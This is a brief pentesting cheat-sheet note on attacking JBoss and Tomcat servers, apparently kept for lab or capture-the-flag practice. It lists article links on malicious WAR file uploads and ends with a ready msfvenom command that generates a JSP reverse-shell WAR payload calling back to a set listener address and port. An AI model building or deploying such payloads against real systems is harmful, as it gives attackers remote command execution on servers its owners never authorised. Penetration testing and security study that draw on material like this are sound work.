#### jboss

initial resource

https://medium.com/@madrobot/exploiting-jboss-like-a-boss-223a8b108206

###### preparing a war file

https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/
https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.17.6.98 LPORT=4243 -f war > shell.war